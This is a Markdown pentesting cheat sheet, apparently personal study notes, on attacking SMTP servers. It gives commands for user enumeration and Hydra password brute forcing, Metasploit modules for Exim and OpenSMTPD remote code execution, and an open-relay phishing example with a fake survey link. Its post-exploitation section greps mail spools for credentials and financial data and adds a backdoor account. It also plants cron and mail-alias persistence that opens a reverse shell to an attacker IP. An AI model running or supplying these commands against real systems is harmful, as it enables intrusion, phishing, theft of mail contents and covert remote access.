---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMTP/Exploitation
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Authentication {{{-->
## Authentication

<!-- Brute Force {{{-->
### Brute Force

Brute force SMTP authentication credentials using various tools

**Usernames**

Brute force SMTP users

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> - [[SecLists#Usernames|SecLists]]
> - [[Wordlists/Metasploit#Usernames|Metasploit]]
>
<!-- }}} -->

[[Metasploit]] — [SMTP User Enumeration Utility](https://www.rapid7.com/db/modules/auxiliary/scanner/smtp/smtp_enum/)

<!-- Info {{{-->
> [!info]-
>
> The SMTP service has two internal commands that allow the enumeration
> of users:
> - [[Usage#VRFY|VRFY]]: Confirming the names of valid users
> - [[Usage#EXPN|EXPN]]: Reveals the actual address of users aliases
>   and lists of e-mail (*mailing lists*)
>
> Through the implementation of these SMTP commands
> can reveal a list of valid users
>
<!-- }}} -->

```sh
use auxiliary/scanner/smtp/smtp_enum
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> search smtp
> ```
> ```sh
> use auxiliary/scanner/smtp/smtp_enum
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> run
> ```
<!-- }}} -->

[[smtp-user-enum]] — Enumerate SMTP users

```sh
smtp-user-enum -M <mode> -U <users.txt> -t $target [-D <domain>] [-w 20]
```

<!-- Info {{{-->
> [!info]-
>
> - `D`: Domain
> - `M`: Mode
> - `t`: Target
> - `U`: Usernames list
> - `w`: Set timeout to `20` seconds (*defaults to* `10` *seconds*)
>
<!-- }}} -->

```sh
smtp-user-enum -M VRFY -U <users.txt> -t $target [-D <domain>]
```

<!-- Example {{{-->
> [!example]-
>
> [[SecLists]]
>
> ```sh
> smtp-user-enum -M VRFY -t $target -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt
> ```
> ```sh
> smtp-user-enum -M VRFY -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
> ```
> ```sh
> smtp-user-enum -M VRFY -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
> ```
> ```sh
> smtp-user-enum -M VRFY -t $target -U /usr/share/seclists/Usernames/Names/names.txt
> ```
>
> [[Metasploit]]
>
> ```sh
> smtp-user-enum -M VRFY -t $target -U /usr/share/wordlists/metasploit/unix_users.txt
> ```
>
<!-- }}} -->

```sh
smtp-user-enum -M RCPT -U <users.txt> -t $target [-D <domain>]
```

<!-- Example {{{-->
> [!example]-
>
> [[SecLists]]
>
> ```sh
> smtp-user-enum -M RCPT -t $target -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt
> ```
> ```sh
> smtp-user-enum -M RCPT -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
> ```
> ```sh
> smtp-user-enum -M RCPT -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
> ```
> ```sh
> smtp-user-enum -M RCPT -t $target -U /usr/share/seclists/Usernames/Names/names.txt
> ```
>
> [[Metasploit]]
>
> ```sh
> smtp-user-enum -M RCPT -t $target -U /usr/share/wordlists/metasploit/unix_users.txt
> ```
>
<!-- }}} -->

```sh
smtp-user-enum -M EXPN -U <users.txt> -t $target [-D <domain>]
```

<!-- Example {{{-->
> [!example]-
>
> [[SecLists]]
>
> ```sh
> smtp-user-enum -M EXPN -t $target -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt
> ```
> ```sh
> smtp-user-enum -M EXPN -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
> ```
> ```sh
> smtp-user-enum -M EXPN -t $target -U /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt
> ```
> ```sh
> smtp-user-enum -M EXPN -t $target -U /usr/share/seclists/Usernames/Names/names.txt
> ```
>
> [[Metasploit]]
>
> ```sh
> smtp-user-enum -M EXPN -t $target -U /usr/share/wordlists/metasploit/unix_users.txt
> ```
>
<!-- }}} -->

**Passwords**

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> - [[SecLists#Passwords|SecLists]]
> - [[Rockyou]]
>
<!-- }}} -->

[[Hydra]]

```sh
hydra -I $target -P <passwords.txt> smtp -V
```

```sh
hydra -I -l <user>@<domain> -P <passwords.txt> smtp://$target
```

```sh
hydra -I -l <user>@<domain> -P <passwords.txt> smtp://$target:587
```

<!-- }}} -->

<!-- Password Spraying {{{-->
### Password Spraying

[[Hydra]] — Password spraying with username list

```sh
hydra -I -L <users.txt> -p <password> smtp://$target
```

```sh
hydra -I -L <users.txt> -p <password> smtp://$target:587
```

<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- CVE-2010-4344 {{{-->
### CVE-2010-4344

[CVE-2010-4344](https://nvd.nist.gov/vuln/detail/cve-2010-4344) —
Heap-based buffer overflow Remote Code Execution

<!-- Info {{{-->
> [!info]-
>
> Heap-based buffer overflow in the `string_vformat` function
> in `string.c` in Exim before `4.70`
> allows remote attackers to execute arbitrary code
> via an SMTP session that includes two MAIL commands
> in conjunction with a large message containing crafted headers,
> leading to improper rejection logging.
>
<!-- }}} -->

[[Metasploit]] — [Exim4 string_format Function Heap Buffer Overflow](https://www.rapid7.com/db/modules/exploit/unix/smtp/exim4_string_format/)

<!-- Info {{{-->
> [!info]-
>
> This module exploits a heap buffer overflow within versions of Exim
> prior to version `4.69`.
>
> By sending a specially crafted message, an attacker can
> corrupt the heap and execute arbitrary code
> with the privileges of the Exim daemon.
>
<!-- }}} -->

```sh
use exploit/unix/smtp/exim4_string_format
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/unix/smtp/exim4_string_format
> ```
>
> ```sh
> show targets
> ```
>
> ```sh
> set TARGET <target_id>
> ```
>
> ```sh
> show options
> ```
>
> ```sh
> check
> ```
>
> ```sh
> run
> ```
>
<!-- }}} -->

<!-- }}} -->

<!-- CVE-2020-7247 {{{-->
### CVE-2020-7247

[CVE-2020-7247](https://nvd.nist.gov/vuln/detail/CVE-2020-7247) —
OpenSMTPD `6.6.1` - Remote Code Execution 

<!-- Info {{{-->
> [!info]-
>
> [Exploit](https://www.exploit-db.com/exploits/47984)
>
> `smtp_mailaddr` in `smtp_session.c` in OpenSMTPD 6.6,
> as used in OpenBSD 6.6 and other products, allows remote attackers
> to execute arbitrary commands as `root` via a crafted SMTP session,
> as demonstrated by shell metacharacters in a `MAIL FROM` field.
>
> This affects the "uncommented" default configuration.
>
> The issue exists because of an incorrect return value upon failure of input validation.
>
> [Source](https://www.openwall.com/lists/oss-security/2020/01/28/3)
>
<!-- }}} -->

[[Metasploit]] — [OpenSMTPD MAIL FROM Remote Code Execution](https://www.rapid7.com/db/modules/exploit/unix/smtp/opensmtpd_mail_from_rce/)

<!-- Info {{{-->
> [!info]-
>
> This module exploits a command injection
> in the `MAIL FROM` field during SMTP interaction
> with OpenSMTPD to execute a command as the `root` user
>
<!-- }}} -->

```sh
use exploit/unix/smtp/opensmtpd_mail_from_rce
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Open Relay Attack {{{-->
## Open Relay Attack

Test SMTP server for open relay vulnerabilities
[[SMTP/General#Open Relay Configuration|Open Relay Configuration]]
that allow unauthorized email forwarding

[[swaks]] — Exploit Open Relay

```sh
swaks --from <relay_email> \
      --to <target_emails> \
      --header 'Subject: <subject>' \
      --body '<body>' \
      --server $target
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> swaks --from notifications@inlanefreight.com \
>       --to employees@inlanefreight.com \
>       --header 'Subject: Company Notification' \
>       --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' \
>       --server 10.10.11.213
> ```
>
> ```sh
> === Trying 10.10.11.213:25...
> === Connected to 10.10.11.213.
> <-  220 mail.localdomain SMTP Mailer ready
>  -> EHLO parrot
> <-  250-mail.localdomain
> <-  250-SIZE 33554432
> <-  250-8BITMIME
> <-  250-STARTTLS
> <-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
> <-  250 HELP
>  -> MAIL FROM:<notifications@inlanefreight.com>
> <-  250 OK
>  -> RCPT TO:<employees@inlanefreight.com>
> <-  250 OK
>  -> DATA
> <-  354 End data with <CR><LF>.<CR><LF>
>  -> Date: Thu, 29 Oct 2020 01:36:06 -0400
>  -> To: employees@inlanefreight.com
>  -> From: notifications@inlanefreight.com
>  -> Subject: Company Notification
>  -> Message-Id: <20201029013606.775675@parrot>
>  -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
>  ->
>  -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
>  ->
>  ->
>  -> .
> <-  250 OK
>  -> QUIT
> <-  221 Bye
> === Connection closed with remote host.
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Search for [[Secrets]]

```sh
grep -r -i "user\|passw\|secret\|key" /var/mail/
```

Extract attachments

```sh
find /var/mail/ -name "*.pdf" -o -name "*.doc" -o -name "*.xls"
```

Extract e-mail addresses

```sh
grep -Eiorh '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b' /var/mail/*
```

Extract [[Secrets#Financial|Financial Information]]

```sh
grep -r -i "account\|routing\|ssn\|credit" /var/mail/
```

<!-- Email Harvesting {{{-->
### Email Harvesting

Read mail spool

```sh
cat /var/mail/<username>
```

```sh
cat /var/spool/mail/<username>
```

Maildir Format

```sh
ls -la /home/username/Maildir/cur/
```

```sh
cat /home/username/Maildir/cur/*
```

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Add backdoor user to mail system

```sh
useradd -m -s /bin/bash <user>
```
```sh
echo "<user>:<password>" | chpasswd
```

Create cron job

```sh
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" | crontab -
```

Modify mail aliases

```sh
echo "backdoor: |/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" >> /etc/aliases
newaliases
```

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
